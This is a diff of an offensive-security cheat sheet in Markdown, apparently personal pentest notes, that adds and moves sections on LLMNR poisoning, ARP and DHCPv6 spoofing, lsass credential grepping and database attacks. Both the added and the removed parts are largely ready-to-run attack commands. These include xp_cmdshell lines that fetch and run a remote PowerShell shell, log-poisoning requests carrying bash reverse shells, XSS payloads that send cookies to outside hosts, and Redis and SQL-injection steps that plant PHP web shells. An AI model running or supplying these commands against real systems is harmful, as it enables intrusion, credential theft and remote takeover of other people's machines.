@@ -286,6 +286,123 @@ Cmd > ftp -v -n -s:ftp.txt
 
 
 
+## Network attacks
+
+
+
+### Sniff Traffic
+
+
+#### tcpdump
+
+While connected via SSH:
+
+```
+$ tcpdump -i eth0 -w dump.pcap -s0 'not tcp port 22' &
+```
+
+
+
+### LLMNR/NBNS Poisoning
+
+
+#### Responder
+
+* [www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
+* [github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
+* [github.com/lgandx/Responder](https://github.com/lgandx/Responder)
+
+```
+$ git clone https://github.com/lgandx/Responder
+$ sudo ./Responder.py -I eth0 -wfrdv
+```
+
+
+#### Inveigh
+
+* [github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
+
+```
+$ curl -L https://github.com/Kevin-Robertson/Inveigh/raw/master/Inveigh.ps1 > inveigh.ps1
+PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y –NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
+```
+
+* [github.com/Kevin-Robertson/InveighZero](https://github.com/Kevin-Robertson/InveighZero)
+* [github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
+
+```
+$ curl -L https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/Inveigh.exe > inveigh.exe
+PS > .\inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y
+```
+
+
+
+### ARP Spoofing (ARP Cache Poisoning)
+
+Enable IP forwarding:
+
+```
+$ sudo sysctl -w net.ipv4.ip_forward=1
+(sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward')
+(edit /etc/sysctl.conf "net.ipv4.ip_forward = 1" to make it permanent)
+```
+
+
+#### dsniff [arpspoof]
+
+* [github.com/tecknicaltom/dsniff](https://github.com/tecknicaltom/dsniff)
+
+Install:
+
+```
+$ sudo apt install dsniff -y
+```
+
+Fire up the attack with Wireshark (filter `ip.src == VICTIM_10.0.0.5`) running:
+
+```
+$ sudo arpspoof -c both -t VICTIM_10.0.0.5 GATEWAY_10.0.0.1
+```
+
+
+#### bettercap
+
+* [github.com/bettercap/bettercap](https://github.com/bettercap/bettercap)
+* [www.bettercap.org/modules/](https://www.bettercap.org/modules/)
+* [linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/](https://linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/)
+* [hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy](https://hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy)
+* [www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets](https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets)
+
+Deb dependencies (Ubuntu 18.04 LTS):
+
+* [libpcap0.8_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8_1.8.1-6ubuntu1_amd64.deb.html)
+* [libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb.html)
+* [libpcap-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap-dev_1.8.1-6ubuntu1_amd64.deb.html)
+* [pkg-config_0.29.1-0ubuntu2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/pkg-config_0.29.1-0ubuntu2_amd64.deb.html)
+* [libnetfilter-queue1_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue1_1.0.2-2_amd64.deb.html)
+* [libnfnetlink-dev_1.0.1-3_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libnfnetlink-dev_1.0.1-3_amd64.deb.html)
+* [libnetfilter-queue-dev_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue-dev_1.0.2-2_amd64.deb.html)
+
+
+
+### DHCPv6 Spoofing
+
+
+#### mitm6.py
+
+* [blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
+* [intrinium.com/mitm6-pen-testing/](https://intrinium.com/mitm6-pen-testing/)
+* [github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
+
+```
+$ git clone https://github.com/fox-it/mitm6
+$ python3 setup.py install
+$ mitm6.py -i eth0
+```
+
+
+
+
 ## VNC
 
 Decrypt TightVNC password:
@@ -701,8 +818,11 @@ mimikatz # sekurlsa::logonPasswords full
 Grep for secrets:
 
 ```
+(mimikatz)
 $ grep '* Username : ' lsass-mimikatz.minidump -A2 | grep -e Username -e Password -e NTLM | grep -v null | xclip -i -sel c
+(pypykatz)
 $ grep -P '\tusername ' lsass-pypykatz.minidump -A2 | grep -e username -e password | grep -v None | xclip -i -sel c
+$ grep -P 'Username: ' lsass-pypykatz.minidump -A4 | grep -e Username -e Domain -e NT | grep -v None | xclip -i -sel c
 ```
 
 
@@ -796,6 +916,12 @@ Parse secrets:
 ```
 $ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
 ```
+
+
+
+### Abusing CredSSP / TSPKG
+
+* [clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/](https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/)
 
 
 
@@ -1074,459 +1200,14 @@ PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.
 
 
 
-## LFI/RFI
-
-
-
-### PHP RFI with SMB
-
-`/etc/samba/smb.conf`:
-
-```
-log level = 3
-[share]
-        comment = TEMP
-        path = /tmp/smb
-        writable = no
-        guest ok = yes
-        guest only = yes
-        read only = yes
-        browsable = yes
-        directory mode = 0555
-        force user = nobody
-```
-
-```
-root@kali:$ chmod 0555 /tmp/smb
-root@kali:$ chown -R nobody:nogroup /tmp/smb
-root@kali:$ service smbd restart
-root@kali:$ tail -f /var/log/samba/log.<HOSTNAME>
-```
-
-* [www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
-
-
-
-### Log Poisoning
-
-
-#### PHP
-
-Access log (needs single `'` instead of double `"`):
-
-```
-root@kali:$ nc 127.0.0.1 80
-GET /<?php system($_GET['cmd']); ?>
-
-root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//access.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
-Or
-root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//1&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
-```
-
-Error log:
-
-```
-root@kali:$ curl -X POST 'http://127.0.0.1/vuln1.php' --form "userfile=@docx/sample.docx" --form 'submit=Generate pdf' --referer 'http://nowhere.com/<?php system($_GET["cmd"]); ?>'
-root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//error.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
-Or
-root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//2&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
-```
-
-* [medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899](https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)
-* [outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)
-
-
-
-
-## DBMS
-
-
-
-### MySQL/MariaDB
-
-```
-root@kali:$ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
-```
-
-
-
-### Oracle
-
-
-#### TNS Poison
-
-##### Nmap
-
-```
-$ sudo wget https://gist.githubusercontent.com/JukArkadiy/3d6cff222d1b87e963e7/raw/fbe6fe17a9bca6ce839544b7afb2276fff061d46/oracle-tns-poison.nse -O /usr/share/nmap/scripts/oracle-tns-poison.nse
-$ sudo nmap -v -n -Pn -sV --script=oracle-tns-poison.nse -oA CVE-2014-0160/nmap/tns-poison -p1521 127.0.0.1
-```
-
-##### odat
-
-Install:
-
-* [github.com/quentinhardy/odat/releases](https://github.com/quentinhardy/odat/releases/)
-* [github.com/quentinhardy/odat#installation-optional-for-development-version](https://github.com/quentinhardy/odat#installation-optional-for-development-version)
-
-```
-$ git clone https://github.com/quentinhardy/odat ~/tools/odat && cd ~/tools/odat
-$ git submodule init && git submodule update
-$ sudo apt install libaio1 python3-dev alien python3-pip
-$ wget https://download.oracle.com/otn_software/linux/instantclient/19600/oracle-instantclient19.6-basic-19.6.0.0.0-1.x86_64.rpm
-$ wget https://download.oracle.com/otn_software/linux/instantclient/19600/oracle-instantclient19.6-devel-19.6.0.0.0-1.x86_64.rpm
-$ sudo alien --to-deb *.rpm
-$ sudo dpkg -i *.deb
-$ vi /etc/profile
-...
-export ORACLE_HOME=/usr/lib/oracle/19.6/client64/
-export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
-export PATH=${ORACLE_HOME}bin:$PATH
-...
-$ pip3 install cx_Oracle
-$ python3 odat.py -h
-```
-
-Usage:
-
-* [github.com/quentinhardy/odat/wiki/tnspoison](https://github.com/quentinhardy/odat/wiki/tnspoison)
-
-```
-$ python3 odat.py tnspoison -s 127.0.0.1 -d CLREXTPROC --test-module
-```
-
-
-
-### MS SQL
-
-
-#### Enable xp_cmdshell
-
-```
-1> EXEC sp_configure 'show advanced options', 1
-2> GO
-1> RECONFIGURE
-2> GO
-1> EXEC sp_configure 'xp_cmdshell', 1
-2> GO
-1> RECONFIGURE
-2> GO
-1> EXEC sp_configure 'xp_cmdshell', 1
-2> GO
-1> xp_cmdshell 'whoami'
-2> GO
-```
-
-
-#### sqsh
-
-```
-root@kali:$ sqsh -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
-1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.234/shell.ps1')"
-2> GO
-```
-
-
-#### mssqlclient.py
-
-```
-root@kali:$ mssqlclient.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 [-windows-auth]
-SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.234/shell.ps1\")"
-```
-
-
-#### mssql-cli
-
-* [github.com/dbcli/mssql-cli](https://github.com/dbcli/mssql-cli)
-
-```
-root@kali:$ python -m pip install mssql-cli
-root@kali:$ mssql-cli -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
-```
-
-
-#### DBeaver
-
-* [DBeaver Community](https://dbeaver.io/)
-
-
-#### DbVisualizer
-
-* [DbVisualizer](https://www.dbvis.com/)
-
-
-
-### SQLite
-
-```
-SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%';
-SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='secret_database';
-SELECT username,password FROM secret_database;
-```
-
-
-
-### Redis
-
-
-#### Preparation
-
-Install **[1]** or **[2]**:
-
-```
-root@kali:$ mkdir ~/tools/redis-cli-go && cd ~/tools/redis-cli-go
-root@kali:$ wget [1] -O redis-cli-go && chmod +x redis-cli-go
-root@kali:$ ln -s ~/tools/redis-cli-go/redis-cli-go /usr/local/bin/redis-cli-go && cd -
-```
-
-1. [github.com/holys/redis-cli/releases](https://github.com/holys/redis-cli/releases)
-2. [github.com/antirez/redis](https://github.com/antirez/redis)
-
-Check if vulnarable:
-
-```
-root@kali:$ nc 127.0.0.1 6379
-Escape character is '^]'.
-echo "Hey, no AUTH required!"
-$21
-Hey, no AUTH required!
-quit
-+OK
-Connection closed by foreign host.
-```
-
-
-#### Web Shell
-
-```
-root@kali:$ redis-cli -h 127.0.0.1 flushall
-root@kali:$ redis-cli -h 127.0.0.1 set pwn '<?php system($_REQUEST['cmd']); ?>'
-root@kali:$ redis-cli -h 127.0.0.1 config set dbfilename shell.php
-root@kali:$ redis-cli -h 127.0.0.1 config set dir /var/www/html/
-root@kali:$ redis-cli -h 127.0.0.1 save
-```
-
-* [book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
-
-
-#### Inject SSH PubKey
-
-```
-root@kali:$ ssh-keygen -t ecdsa -s 521 -f key
-root@kali:$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
-root@kali:$ redis-cli -h 127.0.0.1 flushall
-root@kali:$ cat foo.txt | redis-cli -h 127.0.0.1 -x set pwn
-root@kali:$ redis-cli -h 127.0.0.1 config set dbfilename authorized_keys
-root@kali:$ redis-cli -h 127.0.0.1 config set dir /var/lib/redis/.ssh
-root@kali:$ redis-cli -h 127.0.0.1 save
-```
-
-* [packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)
-* [2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
-
-
-
-
-## SQLi
-
-
-
-### sqlmap
-
-* [Usage · sqlmapproject/sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
-* [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)
-
-Write file:
-
-```
-$ sqlmap -r request.req --batch --file-write=./backdoor.php --file-dest=C:/Inetpub/wwwroot/backdoor.php
-```
-
-Test WAF:
-
-```
-$ sqlmap.py -u 'https://127.0.0.1/index.php' --data='{"id":"*"}' -p id --identify-waf --tamper='between,randomcase,space2comment' --random-agent --tor --check-tor --thread=1 -b --batch -v6
-```
-
-* [www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/](https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/)
-
-
-
-### DIOS
-
-MySQL:
-
-```
-id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (information_schema.columns) WHERE (@a) IN (@a:=concat(@a,'<font color=red>',table_schema,'</font>',' ::: ','<font color=green>',table_name,'</font>','<br>'))))a);-- -
-
-SELECT (@a) FROM (
-	SELECT(@a:=0x00), (
-		SELECT (@a) FROM (information_schema.schemata)
-		WHERE (@a) IN (@a:=concat(@a,schema_name,'\n'))
-	)
-) foo
-```
-
-```
-id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (mytable.users) WHERE (@a) IN (@a:=concat(@a,':::',id,':::',login,':::',password)) AND is_admin='1'))a);-- -
-```
-
-* [defcon.ru/web-security/2320/](https://defcon.ru/web-security/2320/)
-* [www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)
-* [dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server](https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server)
-* [www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/](https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/)
-
-
-
-### Truncation Attack
-
-```
-POST /index.php HTTP/1.1
-Host: 127.0.0.1
-
-name=snovvcrash&email=admin%example.com++++++++++11&password=qwe12345
-```
-
-* [www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)
-
-
-
-### Commas blocked by WAF
-
-```
-id=-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b ON 1=1#
-```
-
-
-
-### Write File
-
-```
-id=1' UNION ALL SELECT 1,2,3,4,"<?php if(isset($_REQUEST['c'])){system($_REQUEST['c'].' 2>&1' );} ?>",6 INTO OUTFILE 'C:\\Inetpub\\wwwroot\\backdoor.php';#
-```
-
-
-
-### Read File
-
-```
-id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
-```
-
-
-
-
-## XSS
-
-
-
-### Redirections
-
-```html
-<head> 
-  <meta http-equiv="refresh" content="0; URL=http://www.example.com/" />
-</head>
-```
-
-* [developer.mozilla.org/ru/docs/Web/HTTP/Redirections](https://developer.mozilla.org/ru/docs/Web/HTTP/Redirections)
-
-
-
-### Data Grabbers
-
-
-#### Cookies
-
-Img tag:
-
-```
-<img src="x" onerror="this.src='http://10.10.15.123/?c='+btoa(document.cookie)">
-```
-
-Fetch:
-
-```javascript
-<script>
-fetch('https://<SESSION>.burpcollaborator.net', {
-method: 'POST',
-mode: 'no-cors',
-body: document.cookie
-});
-</script>
-```
-
-* [portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
-
-
-
-### XMLHttpRequest
-
-
-#### XSS to LFI
-
-```javascript
-<script>
-var xhr = new XMLHttpRequest;
-xhr.onload = function() {
-	document.write(this.responseText);
-};
-xhr.open("GET", "file:///etc/passwd");
-xhr.send();
-</script>
-```
-
-```
-<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText);};x.open("GET","file:///etc/passwd");x.send();</script>
-```
-
-* [www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
-
-
-#### XSS to CSRF
-
-If the endpoint is accessible only from localhost:
-
-```javascript
-<script>
-var xhr;
-if (window.XMLHttpRequest) {
-	xhr = new XMLHttpRequest();
-} else {
-	xhr = new ActiveXObject("Microsoft.XMLHTTP");
-}
-xhr.open("POST", "/backdoor.php");
-xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-xhr.send("cmd=powershell -nop -exec bypass -f  \\\\10.10.15.123\\share\\rev.ps1");
-</script>
-```
-
-With capturing CSRF token first:
-
-```javascript
-<script>
-var req = new XMLHttpRequest();
-req.onload = handleResponse;
-req.open('GET', '/email', true);
-req.send();
-function handleResponse() {
-    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
-    var changeReq = new XMLHttpRequest();
-    changeReq.open('POST', '/email/change-email', true);
-    changeReq.send('csrf='+token+'&email=test@example.com')
-};
-</script>
-```
-
-* [portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
-
-
-
-
 ## Metasploit
 
 
 
 ### Debug
+
+1. [github.com/deivid-rodriguez/pry-byebug](https://github.com/deivid-rodriguez/pry-byebug)
+2. [www.youtube.com/watch?v=QzP5nUEhZeg&t=2190](https://www.youtube.com/watch?v=QzP5nUEhZeg&t=2190)
 
 ```
 root@kali:$ gem install pry-byebug
@@ -1558,9 +1239,6 @@ root@kali:$ cp /usr/share/metasploit-framework/modules/exploits/linux/http/packa
 root@kali:$ vi ~/.msf4/modules/exploits/linux/http/p.rb
 ...add "binding.pry"...
 ```
-
-1. [github.com/deivid-rodriguez/pry-byebug](https://github.com/deivid-rodriguez/pry-byebug)
-2. [www.youtube.com/watch?v=QzP5nUEhZeg&t=2190](https://www.youtube.com/watch?v=QzP5nUEhZeg&t=2190)
 
 
 
@@ -2302,6 +1980,7 @@ CWD: `discovery/`
 
 * [edublog.bitcrack.net/2016/09/scanning-network-using-netdiscover-arp.html](http://edublog.bitcrack.net/2016/09/scanning-network-using-netdiscover-arp.html)
 * [null-byte.wonderhowto.com/how-to/use-abuse-address-resolution-protocol-arp-locate-hosts-network-0150333/](https://null-byte.wonderhowto.com/how-to/use-abuse-address-resolution-protocol-arp-locate-hosts-network-0150333/)
+* [www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/](https://www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/)
 
 
 #### arp-scan
@@ -2350,72 +2029,6 @@ Passive traffic analyze. Look for broadcast/multicast, IPv6 packets:
 * STP
 * DHCPv6, ICMPv6
 * mDNS
-
-
-#### Network attacks
-
-##### LLMNR/NBNS Poisoning
-
-Responder:
-
-* [www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
-* [github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
-* [github.com/lgandx/Responder](https://github.com/lgandx/Responder)
-
-```
-$ git clone https://github.com/lgandx/Responder
-$ sudo ./Responder.py -I eth0 -wfrdv
-```
-
-Inveigh:
-
-* [github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
-
-```
-$ curl -L https://github.com/Kevin-Robertson/Inveigh/raw/master/Inveigh.ps1 > inveigh.ps1
-PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y –NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
-```
-
-* [github.com/Kevin-Robertson/InveighZero](https://github.com/Kevin-Robertson/InveighZero)
-* [github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
-
-```
-$ curl -L https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/Inveigh.exe > inveigh.exe
-PS > .\inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y
-```
-
-##### ARP Spoofing (ARP Cache Poisoning)
-
-Install and enable IP forwarding:
-
-```
-$ sudo apt install dsniff -y
-$ sudo sysctl -w net.ipv4.ip_forward=1
-(sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward')
-(edit /etc/sysctl.conf "net.ipv4.ip_forward = 1" to make it permanent)
-```
-
-Fire up the attack with Wireshark (filter `ip.src == VICTIM_10.0.0.5`) running:
-
-```
-$ sudo arpspoof -c both -t VICTIM_10.0.0.5 GATEWAY_10.0.0.1
-```
-
-* [www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/](https://www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/)
-
-##### DHCPv6 Spoofing
-
-mitm6.py:
-
-* [blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
-* [intrinium.com/mitm6-pen-testing/](https://intrinium.com/mitm6-pen-testing/)
-* [github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
-
-```
-$ git clone https://github.com/fox-it/mitm6
-$ python3 setup.py install
-$ mitm6.py -i eth0
-```
 
 
 
@@ -3140,7 +2753,7 @@ root@kali:$ kerbrute bruteuser -d MEGACORP.LOCAL --dc 127.0.0.1 /usr/share/secli
 
 PS > systeminfo
 PS > whoami /priv (whoami /all)
-PS > gci "$env:userprofile" -recurse -force -af |select fullname
+PS > gci "$env:userprofile" -recurse -file -ea SilentlyContinue | select fullname
 PS > net user
 PS > net user /domain
 PS > net user j.doe /domain
@@ -3218,10 +2831,456 @@ $ sudo apt install openjdk-11-jdk
 ```
 
 
+## DBMS
+
+
+
+### MySQL/MariaDB
+
+```
+root@kali:$ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
+```
+
+
+
+### Oracle
+
+
+#### TNS Poison
+
+##### Nmap
+
+```
+$ sudo wget https://gist.githubusercontent.com/JukArkadiy/3d6cff222d1b87e963e7/raw/fbe6fe17a9bca6ce839544b7afb2276fff061d46/oracle-tns-poison.nse -O /usr/share/nmap/scripts/oracle-tns-poison.nse
+$ sudo nmap -v -n -Pn -sV --script=oracle-tns-poison.nse -oA CVE-2014-0160/nmap/tns-poison -p1521 127.0.0.1
+```
+
+##### odat
+
+Install:
+
+* [github.com/quentinhardy/odat/releases](https://github.com/quentinhardy/odat/releases/)
+* [github.com/quentinhardy/odat#installation-optional-for-development-version](https://github.com/quentinhardy/odat#installation-optional-for-development-version)
+
+```
+$ git clone https://github.com/quentinhardy/odat ~/tools/odat && cd ~/tools/odat
+$ git submodule init && git submodule update
+$ sudo apt install libaio1 python3-dev alien python3-pip
+$ wget https://download.oracle.com/otn_software/linux/instantclient/19600/oracle-instantclient19.6-basic-19.6.0.0.0-1.x86_64.rpm
+$ wget https://download.oracle.com/otn_software/linux/instantclient/19600/oracle-instantclient19.6-devel-19.6.0.0.0-1.x86_64.rpm
+$ sudo alien --to-deb *.rpm
+$ sudo dpkg -i *.deb
+$ vi /etc/profile
+...
+export ORACLE_HOME=/usr/lib/oracle/19.6/client64/
+export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
+export PATH=${ORACLE_HOME}bin:$PATH
+...
+$ pip3 install cx_Oracle
+$ python3 odat.py -h
+```
+
+Usage:
+
+* [github.com/quentinhardy/odat/wiki/tnspoison](https://github.com/quentinhardy/odat/wiki/tnspoison)
+
+```
+$ python3 odat.py tnspoison -s 127.0.0.1 -d CLREXTPROC --test-module
+```
+
+
+
+### MS SQL
+
+
+#### Enable xp_cmdshell
+
+```
+1> EXEC sp_configure 'show advanced options', 1
+2> GO
+1> RECONFIGURE
+2> GO
+1> EXEC sp_configure 'xp_cmdshell', 1
+2> GO
+1> RECONFIGURE
+2> GO
+1> EXEC sp_configure 'xp_cmdshell', 1
+2> GO
+1> xp_cmdshell 'whoami'
+2> GO
+```
+
+
+#### sqsh
+
+```
+root@kali:$ sqsh -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
+1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.234/shell.ps1')"
+2> GO
+```
+
+
+#### mssqlclient.py
+
+```
+root@kali:$ mssqlclient.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 [-windows-auth]
+SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.234/shell.ps1\")"
+```
+
+
+#### mssql-cli
+
+* [github.com/dbcli/mssql-cli](https://github.com/dbcli/mssql-cli)
+
+```
+root@kali:$ python -m pip install mssql-cli
+root@kali:$ mssql-cli -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
+```
+
+
+#### DBeaver
+
+* [DBeaver Community](https://dbeaver.io/)
+
+
+#### DbVisualizer
+
+* [DbVisualizer](https://www.dbvis.com/)
+
+
+
+### SQLite
+
+```
+SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%';
+SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='secret_database';
+SELECT username,password FROM secret_database;
+```
+
+
+
+### Redis
+
+* [packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)
+* [2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
+
+
+#### Preparation
+
+Install **[1]** or **[2]**:
+
+```
+root@kali:$ mkdir ~/tools/redis-cli-go && cd ~/tools/redis-cli-go
+root@kali:$ wget [1] -O redis-cli-go && chmod +x redis-cli-go
+root@kali:$ ln -s ~/tools/redis-cli-go/redis-cli-go /usr/local/bin/redis-cli-go && cd -
+```
+
+1. [github.com/holys/redis-cli/releases](https://github.com/holys/redis-cli/releases)
+2. [github.com/antirez/redis](https://github.com/antirez/redis)
+
+Check if vulnarable:
+
+```
+root@kali:$ nc 127.0.0.1 6379
+Escape character is '^]'.
+echo "Hey, no AUTH required!"
+$21
+Hey, no AUTH required!
+quit
++OK
+Connection closed by foreign host.
+```
+
+
+#### Web Shell
+
+```
+root@kali:$ redis-cli -h 127.0.0.1 flushall
+root@kali:$ redis-cli -h 127.0.0.1 set pwn '<?php system($_REQUEST['cmd']); ?>'
+root@kali:$ redis-cli -h 127.0.0.1 config set dbfilename shell.php
+root@kali:$ redis-cli -h 127.0.0.1 config set dir /var/www/html/
+root@kali:$ redis-cli -h 127.0.0.1 save
+```
+
+* [book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
+
+
+#### Inject SSH PubKey
+
+```
+root@kali:$ ssh-keygen -t ecdsa -s 521 -f key
